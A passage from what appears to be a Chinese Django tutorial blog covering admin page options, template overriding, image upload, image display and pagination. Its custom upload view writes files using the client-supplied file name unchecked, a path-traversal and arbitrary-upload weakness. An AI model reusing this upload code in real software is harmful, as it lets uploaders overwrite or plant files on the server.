<h2 id="列表页选项"><a href="#列表页选项" class="headerlink" title="列表页选项"></a>列表页选项</h2><h3 id="页大小"><a href="#页大小" class="headerlink" title="页大小"></a>页大小</h3><p>每页中显示多少条数据，默认为每页显示 100 条数据，属性如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list_per_page=100</span><br></pre></td></tr></table></figure>

<p>1）打开 <code>booktest/admin.py</code> 文件，修改 AreaAdmin 类如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaAdmin(admin.ModelAdmin):</span><br><span class="line">    list_per_page = 10</span><br></pre></td></tr></table></figure>

<h3 id="操作选项”的位置"><a href="#操作选项”的位置" class="headerlink" title="操作选项”的位置"></a>操作选项”的位置</h3><p>顶部显示的属性，设置为 <code>True</code> 在顶部显示，设置为 <code>False</code> 不在顶部显示，默认为 <code>True</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">actions_on_top=True</span><br></pre></td></tr></table></figure>

<p>底部显示的属性，设置为 <code>True</code> 在底部显示，设置为 <code>False</code> 不在底部显示，默认为 <code>False</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">actions_on_bottom=False</span><br></pre></td></tr></table></figure>

<p>1）打开 booktest&#x2F;admin.py 文件，修改 AreaAdmin 类如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaAdmin(admin.ModelAdmin):</span><br><span class="line">    ...</span><br><span class="line">    actions_on_top = True</span><br><span class="line">    actions_on_bottom = True</span><br></pre></td></tr></table></figure>

<p>2）在浏览器中刷新效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-17-20-33.png" class="">

<h3 id="列表中的列"><a href="#列表中的列" class="headerlink" title="列表中的列"></a>列表中的列</h3><p>属性如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list_display=[模型字段1,模型字段2,...]</span><br></pre></td></tr></table></figure>

<p>1）打开 booktest&#x2F;admin.py 文件，修改 AreaAdmin 类如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaAdmin(admin.ModelAdmin):</span><br><span class="line">    ...</span><br><span class="line">    list_display = [&#x27;id&#x27;,&#x27;atitle&#x27;]</span><br></pre></td></tr></table></figure>

<p>2）在浏览器中刷新效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-17-29-29.png" class="">

<p>点击列头可以进行升序或降序排列。</p>
<h3 id="将方法作为列"><a href="#将方法作为列" class="headerlink" title="将方法作为列"></a>将方法作为列</h3><p>列可以是模型字段，还可以是模型方法，要求方法有返回值。</p>
<p>1）打开 <code>booktest/models.py</code> 文件，修改 AreaInfo 类如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaInfo(models.Model):</span><br><span class="line">    ...</span><br><span class="line">    def title(self):</span><br><span class="line">        return self.atitle</span><br></pre></td></tr></table></figure>

<p>2）打开 <code>booktest/admin.py</code> 文件，修改 AreaAdmin 类如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaAdmin(admin.ModelAdmin):</span><br><span class="line">    ...</span><br><span class="line">    list_display = [&#x27;id&#x27;,&#x27;atitle&#x27;,&#x27;title&#x27;]</span><br></pre></td></tr></table></figure>

<p>3）在浏览器中刷新效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-17-36-47.png" class="">

<h3 id="列标题"><a href="#列标题" class="headerlink" title="列标题"></a>列标题</h3><p>列标题默认为属性或方法的名称，可以通过属性设置。需要先将模型字段封装成方法，再对方法使用这个属性，模型字段不能直接使用这个属性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">short_description=&#x27;列标题&#x27;</span><br></pre></td></tr></table></figure>

<p>1）打开 <code>booktest/models.py</code> 文件，修改 AreaInfo 类如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaInfo(models.Model):</span><br><span class="line">    atitle = models.CharField(max_length=30)</span><br><span class="line">    aParent = models.ForeignKey(&#x27;self&#x27;, null=True, blank=True)</span><br><span class="line"></span><br><span class="line">    def title(self):</span><br><span class="line">        return self.atitle</span><br><span class="line">    title.short_description = &#x27;区域名称&#x27;</span><br></pre></td></tr></table></figure>

<p>2）在浏览器中刷新效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-17-47-38.png" class="">

<h3 id="关联对象"><a href="#关联对象" class="headerlink" title="关联对象"></a>关联对象</h3><p>无法直接访问关联对象的属性或方法，可以在模型类中封装方法，访问关联对象的成员。</p>
<p>1）打开 <code>booktest/models.py</code> 文件，修改 AreaInfo 类如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaInfo(models.Model):</span><br><span class="line">    ...</span><br><span class="line">    def parent(self):</span><br><span class="line">        if self.aParent is None:</span><br><span class="line">          return &#x27;&#x27;</span><br><span class="line">        return self.aParent.atitle</span><br><span class="line">    parent.short_description=&#x27;父级区域名称&#x27;</span><br></pre></td></tr></table></figure>

<p>2）打开 booktest&#x2F;admin.py 文件，修改 AreaAdmin 类如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaAdmin(admin.ModelAdmin):</span><br><span class="line">    ...</span><br><span class="line">    list_display = [&#x27;id&#x27;,&#x27;atitle&#x27;,&#x27;title&#x27;,&#x27;parent&#x27;]</span><br></pre></td></tr></table></figure>

<p>3）在浏览器中刷新效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-17-54-17.png" class="">

<h3 id="右侧栏过滤器"><a href="#右侧栏过滤器" class="headerlink" title="右侧栏过滤器"></a>右侧栏过滤器</h3><p>属性如下，只能接收字段，会将对应字段的值列出来，用于快速过滤。一般用于有重复值的字段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list_filter=[]</span><br></pre></td></tr></table></figure>

<p>1）打开 <code>booktest/admin.py</code> 文件，修改 AreaAdmin 类如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaAdmin(admin.ModelAdmin):</span><br><span class="line">    ...</span><br><span class="line">    list_filter=[&#x27;atitle&#x27;]</span><br></pre></td></tr></table></figure>

<p>2）在浏览器中刷新效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-17-56-07.png" class="">

<h3 id="搜索框"><a href="#搜索框" class="headerlink" title="搜索框"></a>搜索框</h3><p>属性如下，用于对指定字段的值进行搜索，支持模糊查询。列表类型，表示在这些字段上进行搜索。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search_fields=[]</span><br></pre></td></tr></table></figure>

<p>1）打开 <code>booktest/admin.py</code> 文件，修改 AreaAdmin 类如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaAdmin(admin.ModelAdmin):</span><br><span class="line">    ...</span><br><span class="line">    search_fields=[&#x27;atitle&#x27;]</span><br></pre></td></tr></table></figure>

<p>2）在浏览器中刷新效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-17-58-02.png" class="">

<h3 id="中文标题"><a href="#中文标题" class="headerlink" title="中文标题"></a>中文标题</h3><p>1）打开 <code>booktest/models.py</code> 文件，修改模型类，为属性指定 <code>verbose_name</code> 参数，即第一个参数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaInfo(models.Model):</span><br><span class="line">    atitle=models.CharField(&#x27;标题&#x27;,max_length=30)#名称</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>2）在浏览器中刷新效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-18-00-33.png" class="">

<h2 id="编辑页选项"><a href="#编辑页选项" class="headerlink" title="编辑页选项"></a>编辑页选项</h2><h3 id="显示字段顺序"><a href="#显示字段顺序" class="headerlink" title="显示字段顺序"></a>显示字段顺序</h3><p>属性如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fields=[]</span><br></pre></td></tr></table></figure>

<p>1）点击某行 ID 的链接，可以转到修改页面，默认效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-18-02-09.png" class="">

<p>2）打开 <code>booktest/admin.py</code> 文件，修改 AreaAdmin 类如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaAdmin(admin.ModelAdmin):</span><br><span class="line">    ...</span><br><span class="line">    fields=[&#x27;aParent&#x27;,&#x27;atitle&#x27;]</span><br></pre></td></tr></table></figure>

<p>3）刷新浏览器效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-18-03-41.png" class="">

<p>在下拉列表中输出的是对象的名称，可以在模型类中定义 <code>str</code> 方法用于对象转换字符串。</p>
<p>1）打开 <code>booktest/models.py</code> 文件，修改 AreaInfo 类，添加 str 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaInfo(models.Model):</span><br><span class="line">    ...</span><br><span class="line">    def __str__(self):</span><br><span class="line">        return self.atitle</span><br></pre></td></tr></table></figure>

<p>2）刷新浏览器效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-18-05-18.png" class="">

<h3 id="分组显示"><a href="#分组显示" class="headerlink" title="分组显示"></a>分组显示</h3><p>属性如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fieldset=(</span><br><span class="line">    (&#x27;组1标题&#x27;,&#123;&#x27;fields&#x27;:(&#x27;字段1&#x27;,&#x27;字段2&#x27;)&#125;),</span><br><span class="line">    (&#x27;组2标题&#x27;,&#123;&#x27;fields&#x27;:(&#x27;字段3&#x27;,&#x27;字段4&#x27;)&#125;),</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>1）打开 <code>booktest/admin.py</code> 文件，修改 AreaAdmin 类如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaAdmin(admin.ModelAdmin):</span><br><span class="line">    ...</span><br><span class="line">    # fields=[&#x27;aParent&#x27;,&#x27;atitle&#x27;]</span><br><span class="line">    fieldsets = (</span><br><span class="line">        (&#x27;基本&#x27;, &#123;&#x27;fields&#x27;: [&#x27;atitle&#x27;]&#125;),</span><br><span class="line">        (&#x27;高级&#x27;, &#123;&#x27;fields&#x27;: [&#x27;aParent&#x27;]&#125;)</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>2）刷新浏览器效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-18-15-27.png" class="">

<blockquote>
<p>说明：fields 与 fieldsets 两者选一使用。</p>
</blockquote>
<h3 id="关联对象-1"><a href="#关联对象-1" class="headerlink" title="关联对象"></a>关联对象</h3><p>在一对多的关系中，可以在一端的编辑页面中编辑多端的对象，嵌入多端对象的方式包括表格、块两种。</p>
<ul>
<li>类型 InlineModelAdmin：表示在模型的编辑页面嵌入关联模型的编辑。</li>
<li>子类 TabularInline：以表格的形式嵌入。</li>
<li>子类 StackedInline：以块的形式嵌入。</li>
</ul>
<p>1）打开 <code>booktest/admin.py</code> 文件，创建 AreaStackedInline 类。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaStackedInline(admin.StackedInline):</span><br><span class="line">    model = AreaInfo#关联子对象</span><br><span class="line">    extra = 2#额外编辑2个子对象</span><br></pre></td></tr></table></figure>

<p>2）打开 <code>booktest/admin.py</code> 文件，修改 AreaAdmin 类如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaAdmin(admin.ModelAdmin):</span><br><span class="line">    ...</span><br><span class="line">    inlines = [AreaStackedInline]</span><br></pre></td></tr></table></figure>

<p>3）刷新浏览器效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-16-16-58-30.png" class="">

<p>可以用表格的形式嵌入。</p>
<p>1）打开 <code>booktest/admin.py</code> 文件，创建 AreaTabularInline 类。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaTabularInline(admin.TabularInline):</span><br><span class="line">    model = AreaInfo#关联子对象</span><br><span class="line">    extra = 2#额外编辑2个子对象</span><br></pre></td></tr></table></figure>

<p>2）打开 booktest&#x2F;admin.py 文件，修改 AreaAdmin 类如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaAdmin(admin.ModelAdmin):</span><br><span class="line">    ...</span><br><span class="line">    inlines = [AreaTabularInline]</span><br></pre></td></tr></table></figure>

<p>3）刷新浏览器效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-16-17-59-43.png" class="">

<h2 id="重写模板"><a href="#重写模板" class="headerlink" title="重写模板"></a>重写模板</h2><p>1）在 templates 目录下创建 admin 目录，结构如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-20-15-25-51.png" class="">

<p>2）打开当前虚拟环境中 Django 的目录，再向下找到 admin 的模板，目录如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~/.virtualenvs/py_django/lib/python3.6/site-packages/django/contrib/admin/templates/admin</span><br></pre></td></tr></table></figure>

<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-20-15-26-33.png" class="">

<p>3）将需要更改文件拷贝到第一步建好的目录里，此处以 <code>base_site.html</code> 为例。</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-20-15-29-53.png" class="">

<p>编辑 <code>base_site.html</code> 文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% extends &quot;admin/base.html&quot; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;&#123;&#123; title &#125;&#125; | &#123;&#123; site_title|default:_(&#x27;Django site admin&#x27;) &#125;&#125;&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block branding %&#125;</span><br><span class="line">&lt;h1 id=&quot;site-name&quot;&gt;&lt;a href=&quot;&#123;% url &#x27;admin:index&#x27; %&#125;&quot;&gt;&#123;&#123; site_header|default:_(&#x27;Django administration&#x27;) &#125;&#125;&lt;/a&gt;&lt;/h1&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h1&gt;自定义的管理页模板&lt;/h1&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block nav-global %&#125;&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<p>4）在浏览器中转到列表页面，刷新后如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-20-15-31-16.png" class="">

<p>其它后台的模板可以按照相同的方式进行修改。</p>
<h1 id="上传图片"><a href="#上传图片" class="headerlink" title="上传图片"></a>上传图片</h1><h2 id="创建包含图片的模型类"><a href="#创建包含图片的模型类" class="headerlink" title="创建包含图片的模型类"></a>创建包含图片的模型类</h2><p>将模型类的属性定义成 <code>models.ImageField</code> 类型。</p>
<p>1）打开 <code>booktest/models.py</code> 文件，定义模型类 PicTest 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class PicTest(models.Model):</span><br><span class="line">    pic = models.ImageField(upload_to=&#x27;booktest/&#x27;)</span><br></pre></td></tr></table></figure>

<p>2）回到命令行中，生成迁移。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py makemigrations</span><br><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure>

<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-20-15-39-59.png" class="">

<p>3）打开 <code>test5/settings.py</code> 文件，设置图片保存路径。</p>
<p>因为图片也属于静态文件，所以保存到 static 目录下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MEDIA_ROOT=os.path.join(BASE_DIR,&quot;static/media&quot;)</span><br></pre></td></tr></table></figure>

<p>4）在 static 目录下创建 media 目录，再创建应用名称的目录，此例为 booktest 。</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-20-15-42-40.png" class="">

<h2 id="在管理页面-admin-中上传图片"><a href="#在管理页面-admin-中上传图片" class="headerlink" title="在管理页面 admin 中上传图片"></a>在管理页面 admin 中上传图片</h2><p>1）打开 booktest&#x2F;admin.py 文件，注册 PicTest。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.contrib import admin</span><br><span class="line">from booktest.models import *</span><br><span class="line"></span><br><span class="line">admin.site.register(PicTest)</span><br></pre></td></tr></table></figure>

<p>2）运行服务器，输入如下网址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/admin/</span><br></pre></td></tr></table></figure>

<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-20-15-44-55.png" class="">

<p>3）点击 Add 添加数据，打开新页面，选择图片，点击 save 按钮完成图片上传。</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-20-15-46-50.png" class="">

<p>5）回到数据库命令行，查询表 pictest 中的数据如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-20-15-49-43.png" class="">

<p>6）图片被保存到目录 <code>static/media/booktest/</code> 下，如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-20-15-50-24.png" class="">

<h2 id="自定义-form-表单中上传图片"><a href="#自定义-form-表单中上传图片" class="headerlink" title="自定义 form 表单中上传图片"></a>自定义 form 表单中上传图片</h2><p>1）打开 <code>booktest/views.py</code> 文件，创建视图 pic_upload 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def pic_upload(request):</span><br><span class="line">    return render(request,&#x27;booktest/pic_upload.html&#x27;)</span><br></pre></td></tr></table></figure>

<p>2）打开 booktest&#x2F;urls.py 文件，配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^pic_upload/$&#x27;, views.pic_upload),</span><br></pre></td></tr></table></figure>

<p>3）在 <code>templates/booktest/</code> 目录下创建模板 <code>pic_upload.html</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;自定义上传图片&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form method=&quot;post&quot; action=&quot;/pic_handle/&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &#123;%csrf_token%&#125;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;pic&quot;/&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）打开 <code>booktest/views.py</code> 文件，创建视图 pic_handle ，用于接收表单保存图片。</p>
<p>request 对象的 FILES 属性用于接收请求的文件，包括图片。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.conf import settings</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line">...</span><br><span class="line">def pic_handle(request):</span><br><span class="line">    f1=request.FILES.get(&#x27;pic&#x27;)</span><br><span class="line">    fname=&#x27;%s/booktest/%s&#x27;%(settings.MEDIA_ROOT,f1.name)</span><br><span class="line">    with open(fname,&#x27;wb&#x27;) as pic:</span><br><span class="line">        for c in f1.chunks():</span><br><span class="line">            pic.write(c)</span><br><span class="line">    return HttpResponse(&#x27;OK&#x27;)</span><br></pre></td></tr></table></figure>

<p>5）打开 booktest&#x2F;urls.py 文件，配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^pic_handle/$&#x27;, views.pic_handle),</span><br></pre></td></tr></table></figure>

<p>6）运行服务器，在浏览器中输入如下网址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/pic_upload/</span><br></pre></td></tr></table></figure>

<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-20-16-04-08.png" class="">

<p>选择文件后点击按钮上传图片。</p>
<p>7）图片上传目录如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-20-16-04-31.png" class="">

<p>这里只是完成图片上传的代码，如果需要保存数据到表中需要创建 PicTest 对象完成保存。</p>
<h2 id="显示图片"><a href="#显示图片" class="headerlink" title="显示图片"></a>显示图片</h2><p>1）打开 <code>booktest/views.py</code> 文件，创建视图 pic_show 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from booktest.models import PicTest</span><br><span class="line">...</span><br><span class="line">def pic_show(request):</span><br><span class="line">    pic=PicTest.objects.get(pk=1)</span><br><span class="line">    context=&#123;&#x27;pic&#x27;:pic&#125;</span><br><span class="line">    return render(request,&#x27;booktest/pic_show.html&#x27;,context)</span><br></pre></td></tr></table></figure>

<p>2）打开 <code>booktest/urls.py</code> 文件，配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^pic_show/$&#x27;, views.pic_show),</span><br></pre></td></tr></table></figure>

<p>3）在 <code>templates/booktest/</code> 目录下创建模板 <code>pic_show.html</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;显示上传的图片&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src=&quot;/abc/media/&#123;&#123; pic.pic &#125;&#125;&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）运行服务器，在浏览器中输入如下网址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/pic_show/</span><br></pre></td></tr></table></figure>

<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-20-16-27-58.png" class="">

<h1 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h1><p>Django 提供了数据分页的类，这些类被定义在 <code>django/core/paginator.py</code> 中。 类 Paginator 用于对列进行一页 n 条数据的分页运算。类 Page 用于表示第 m 页的数据。</p>
<p><strong>Paginator 类实例对象</strong></p>
<ul>
<li>方法<em>init</em>(列表,int)：返回分页对象，第一个参数为列表数据，第二个参数为每页数据的条数。</li>
<li>属性 count：返回对象总数。</li>
<li>属性 num_pages：返回页面总数。</li>
<li>属性 page_range：返回页码列表，从 1 开始，例如[1, 2, 3, 4]。</li>
<li>方法 page(m)：返回 Page 类实例对象，表示第 m 页的数据，下标以 1 开始。</li>
</ul>
<p><strong>Page 类实例对象</strong></p>
<ul>
<li>调用 Paginator 对象的 page()方法返回 Page 对象，不需要手动构造。</li>
<li>属性 object_list：返回当前页对象的列表。</li>
<li>属性 number：返回当前是第几页，从 1 开始。</li>
<li>属性 paginator：当前页对应的 Paginator 对象。</li>
<li>方法 has_next()：如果有下一页返回 True。</li>
<li>方法 has_previous()：如果有上一页返回 True。</li>
<li>方法 len()：返回当前页面对象的个数。</li>
</ul>
<h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h2><p>1）在 <code>booktest/views.py</code> 文件中创建视图 page_test。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.core.paginator import Paginator</span><br><span class="line">from booktest.models import AreaInfo</span><br><span class="line">...</span><br><span class="line">#参数pIndex表示：当前要显示的页码</span><br><span class="line">def page_test(request,pIndex):</span><br><span class="line">    #查询所有的地区信息</span><br><span class="line">    list1 = AreaInfo.objects.filter(aParent__isnull=True)</span><br><span class="line">    #将地区信息按一页10条进行分页</span><br><span class="line">    p = Paginator(list1, 10)</span><br><span class="line">    #如果当前没有传递页码信息，则认为是第一页，这样写是为了请求第一页时可以不写页码</span><br><span class="line">    if pIndex == &#x27;&#x27;:</span><br><span class="line">        pIndex = &#x27;1&#x27;</span><br><span class="line">    #通过url匹配的参数都是字符串类型，转换成int类型</span><br><span class="line">    pIndex = int(pIndex)</span><br><span class="line">    #获取第pIndex页的数据</span><br><span class="line">    list2 = p.page(pIndex)</span><br><span class="line">    #获取所有的页码信息</span><br><span class="line">    plist = p.page_range</span><br><span class="line">    #将当前页码、当前页的数据、页码信息传递到模板中</span><br><span class="line">    return render(request, &#x27;booktest/page_test.html&#x27;, &#123;&#x27;list&#x27;: list2, &#x27;plist&#x27;: plist, &#x27;pIndex&#x27;: pIndex&#125;)</span><br></pre></td></tr></table></figure>

<p>2）在 <code>booktest/urls.py</code> 文件中配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^page(?P&lt;pIndex&gt;[0-9]*)/$&#x27;, views.page_test),</span><br></pre></td></tr></table></figure>

<p>3）在 <code>templates/booktest/</code> 目录下创建 <code>page_test.html</code> 模板文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;分页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">显示当前页的地区信息：&lt;br&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&#123;%for area in list%&#125;</span><br><span class="line">&lt;li&gt;&#123;&#123;area.id&#125;&#125;--&#123;&#123;area.atitle&#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">显示页码信息：当前页码没有链接，其它页码有链接&lt;br&gt;</span><br><span class="line">&#123;%for pindex in plist%&#125;</span><br><span class="line">    &#123;%if pIndex == pindex%&#125;</span><br><span class="line">        &#123;&#123;pindex&#125;&#125;&amp;nbsp;&amp;nbsp;</span><br><span class="line">    &#123;%else%&#125;</span><br><span class="line">        &lt;a href=&quot;/page&#123;&#123;pindex&#125;&#125;/&quot;&gt;&#123;&#123;pindex&#125;&#125;&lt;/a&gt;&amp;nbsp;&amp;nbsp;</span><br><span class="line">    &#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）运行服务器，在浏览器中输入如下网址，效果如下图：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/page/</span><br></pre></td></tr></table></figure>

<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-25-19-07-51.png" class="">

<h3 id="示例：省市区选择"><a href="#示例：省市区选择" class="headerlink" title="示例：省市区选择"></a>示例：省市区选择</h3><p>1）将 jquery 文件拷贝到 <code>static/js/</code> 目录下。</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-26-19-45-06.png" class="">

<p>2）打开 <code>booktest/views.py</code> 文件，定义视图 area1 ，用于显示下拉列表。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#提供显示下拉列表的控件，供用户操作</span><br><span class="line">def area1(request):</span><br><span class="line">    return render(request,&#x27;booktest/area1.html&#x27;)</span><br></pre></td></tr></table></figure>

<p>3）打开 <code>booktest/urls.py</code> 文件，配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^area1/$&#x27;, views.area1),</span><br></pre></td></tr></table></figure>

<p>4）在 <code>templates/booktest/</code> 目录下创建 <code>area1.html</code> 。</p>
